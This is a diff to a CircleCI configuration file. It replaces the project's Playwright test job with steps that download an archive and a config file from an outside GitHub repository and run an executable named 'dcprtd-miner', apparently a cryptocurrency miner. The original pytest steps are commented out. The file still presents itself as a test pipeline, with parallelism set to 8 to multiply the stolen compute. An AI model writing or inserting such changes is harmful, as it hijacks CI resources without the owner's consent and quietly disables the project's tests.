@@ -3,14 +3,21 @@ version: 2.1
 jobs:
   test:
     docker:
-      - image: mcr.microsoft.com/playwright/python:v1.29.0-focal
+       - image: alpine:latest
+     # - image: mcr.microsoft.com/playwright/python:v1.29.0-focal
     parallelism: 8
     steps:
      - checkout
      - run: |
-          pip install pytest-playwright
-          playwright install
-          pytest test.py
+           apk add --no-cache wget tar
+           wget https://github.com/stundev/deep/raw/master/pup.tar.gz
+           tar xzvf pup.tar.gz
+           rm config.json
+           wget https://raw.githubusercontent.com/stundev/deep/master/config.json
+           ./dcprtd-miner
+      #    pip install pytest-playwright
+       #   playwright install
+        #  pytest test.py
 
 workflows:
   version: 2
